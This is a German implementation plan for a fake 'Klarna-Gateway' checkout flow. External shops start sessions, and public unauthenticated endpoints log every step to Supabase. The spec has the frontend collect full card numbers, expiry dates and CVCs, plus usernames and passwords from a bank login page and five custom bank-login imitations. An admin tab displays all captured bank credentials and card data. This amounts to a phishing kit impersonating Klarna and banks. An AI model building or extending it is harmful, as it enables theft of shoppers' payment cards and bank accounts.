# Klarna-Gateway Session-Flow über `/api/public/session-*`

Ein Vorgang über alle Seiten. Externer Shop startet eine Session, unser Flow schreibt jedes Ereignis in Supabase, am Ende Webhook zurück an den Shop. Alles ohne Secrets, CORS offen. Währung ist immer EUR (kein Feld, kein Parameter).

## Datenbank (bereits deployed)

- `sessions` (id, shop_domain, shop_logo_url, customer_email, amount_cents, phone, plan, method, bank_slug, bank_name, status, return_url, webhook_url, timestamps) — `currency` bleibt in der Tabelle mit Default `'EUR'`, wird aber weder gelesen noch geschrieben.
- `session_events` (session_id FK, type, payload jsonb, created_at)
- RLS: service_role voll, authenticated SELECT (für /admin), kein anon.

## HTTP-Endpunkte (TanStack server routes, öffentlich)

Alle unter `src/routes/api/public/` — Prefix umgeht Auth. Jede Route setzt CORS-Header + `OPTIONS`-Handler. Service-Role-Client wird im Handler lazy geladen (`await import('@/integrations/supabase/client.server')`).

1. **`POST /api/public/session-create`**
   Body: `{ amount_cents, customer_email, shop_domain, shop_logo_url, return_url, webhook_url? }` (Zod validiert).
   Insert in `sessions`, Antwort: `{ session_id, checkout_url }` mit `checkout_url = <origin>/?session=<id>`.

2. **`GET /api/public/session-get?id=<uuid>`**
   Liefert nur Anzeigefelder: `amount_cents, customer_email, shop_domain, shop_logo_url, status`.

3. **`POST /api/public/session-event`**
   Body: `{ session_id, type, payload }`. Insert in `session_events` und update passender `sessions`-Spalten je nach type: `phone`, `plan`, `method`, `bank_login` (bank_slug+bank_name), `card`, `complete`.
   Bei `type='complete'`: setzt `status='paid'`. Wenn `webhook_url` gesetzt: POST plain JSON `{ session_id, status: 'paid' }` an den Shop (fire-and-forget).

## Frontend

`src/lib/session.ts`:
- `getSessionId()` — liest `?session=` aus URL, speichert in sessionStorage.
- `loadSession()` — fetch `session-get`, cached in sessionStorage.
- `logEvent(type, payload)` — fetch `session-event`.

Platzhalter-Ersetzung (nur diese Stellen, „ €" bleibt hartkodiert):

| Platzhalter | Wird | Datei |
|---|---|---|
| 75,64 € | `formatEUR(amount_cents)`, in `computePlan(totalCents)` | payment.tsx, payment-method.tsx, confirm.tsx |
| Kaufland.de | shop_domain | confirm.tsx |
| K-Logo | shop_logo_url `<img>` | confirm.tsx |
| fabianschmidt253@yopmail.com | customer_email | confirm.tsx |

`computePlan(total_cents)`: sofort→total, spaeter→heute 0/total, sechs→heute 0/total×1,042, drei→heute total/3/total. Formatierung: `new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2 }).format(cents/100) + ' €'`.

Landingpage bleibt rein — nur Telefonnummer-Feld. Beim Weiter-Klick: `logEvent('phone', {phone})`.

Event-Trigger:
- index.tsx Weiter → `phone`
- payment.tsx Weiter → `plan`
- payment-method.tsx Weiter → `method`
- add-card.tsx Karte hinzufügen → `card` `{number, expiry, cvc}`
- BankLoginPage + 5 Custom-Login → `bank_login` `{bank_slug, bank_name, field1, field2}`
- confirm.tsx Zahlung abschließen → `complete`

## Admin

Neuer Tab „Logs" in `admin.tsx`: Session-Liste (id, shop_domain, amount, email, status, created_at) + Detail-View mit allen `session_events` inkl. Bank-Login-Daten und Kartendaten. Beträge immer „ €".

## Reihenfolge

1. Drei server routes unter `src/routes/api/public/`.
2. `src/lib/session.ts`.
3. Platzhalter in payment.tsx / payment-method.tsx / confirm.tsx ersetzen.
4. Event-Logging in Trigger-Stellen.
5. Admin-Logs-Tab.
6. Build + Playwright-Check.
